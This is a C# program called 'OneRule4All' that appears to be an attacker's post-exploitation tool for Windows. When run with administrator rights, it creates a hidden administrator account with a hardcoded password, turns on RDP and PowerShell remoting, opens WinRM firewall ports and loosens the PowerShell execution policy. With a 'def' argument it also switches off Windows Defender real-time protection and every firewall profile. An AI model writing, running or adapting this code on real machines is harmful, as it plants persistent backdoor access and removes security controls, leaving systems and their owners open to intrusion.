using System;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.Linq;
using System.Security.Principal;
using Microsoft.Win32;

namespace OneRule4All
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[------------------  OneRule4All  --------------------]");
            // Check if the application is running as administrator
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!isAdmin)
            {
                Console.WriteLine("[ERROR] This application must be run as an administrator");
                Console.WriteLine("[----------------  by h4rithd.com  -------------------]");
                return;
            }

            // Check if user already exists
            string username = "h4rithd";
            PrincipalContext context = new PrincipalContext(ContextType.Machine);
            UserPrincipal user = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, username);
            GroupPrincipal group = GroupPrincipal.FindByIdentity(context, "Administrators");

            if (user != null)
            {
                Console.WriteLine("[INFO] User {0} already exists, skipping user creation", username);
            }
            else
            {
                // Create a new user account
                string password = "Password@123";
                user = new UserPrincipal(context);
                user.SamAccountName = username;
                user.SetPassword(password);
                user.Enabled = true;
                user.Save();
                Console.WriteLine("[SUCCESS] Created new user account: {0}:{1}", username, password);

                group.Members.Add(context, IdentityType.SamAccountName, username);
                group.Save();
                Console.WriteLine("[SUCCESS] Added user to the Administrators group");
                
            }

            // Check if user is already a member of the Administrators group
            if (group == null)
            {
                Console.WriteLine("[ERROR] Could not find Administrators group");
            }
            else
            {
                try
                {
                    if (group.Members != null && group.Members.Count > 0 && group.Members.Contains(user))
                    {
                        Console.WriteLine("[INFO] User {0} is already a member of the Administrators group, skipping group membership update", username);
                    }
                    else
                    {
                        // Add the user to the Administrators group
                        group.Members.Add(context, IdentityType.SamAccountName, username);
                        group.Save();
                        Console.WriteLine("[SUCCESS] Added user to the Administrators group");
                    }
                }
                catch (PrincipalOperationException ex)
                {
                    Console.WriteLine("[ERROR] Error occurred while checking group membership: {0}", ex.Message);
                }
            }


            // Enable RDP and PSRemoting ports
            RegistryKey rdpKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Control\\Terminal Server", true);
            rdpKey.SetValue("fDenyTSConnections", 0);
            Console.WriteLine("[SUCCESS] Enabled RDP");

            ProcessStartInfo psi = new ProcessStartInfo("powershell.exe");
            psi.RedirectStandardInput = true;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process ps = Process.Start(psi);
            ps.StandardInput.WriteLine("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force");
            ps.StandardInput.WriteLine("Enable-PSRemoting -SkipNetworkProfileCheck -Force");
            ps.StandardInput.WriteLine("New-NetFirewallRule -DisplayName 'Windows Remote Management (HTTP-In)' -Name 'WinRMHTTPIn' -Protocol tcp -LocalPort 5985 -Action Allow");
            ps.StandardInput.WriteLine("New-NetFirewallRule -DisplayName 'Windows Remote Management (HTTPS-In)' -Name 'WinRMHTTPSIn' -Protocol tcp -LocalPort 5986 -Action Allow");
            ps.StandardInput.WriteLine("Exit");
            string output = ps.StandardOutput.ReadToEnd();
            if (output.Contains("WinRM service is already running on this machine"))
            {
                Console.WriteLine("[SUCCESS] PSRemoting is already enabled");
            }
            else
            {
                Console.WriteLine("[ERROR] Enable PSRemoting failed: {0}", output);
            }

            // Check if 'def' argument is present and disable Windows Defender and Firewall
            if (args.Contains("def"))
            {
                Process.Start("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true");
                Console.WriteLine("[SUCCESS] Windows Defender disabled");
                Process.Start("powershell.exe", "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
                Console.WriteLine("[SUCCESS] Windows Firewall disabled");
            }
            Console.WriteLine("[----------------  by h4rithd.com  -------------------]");
        }
        
    }

}
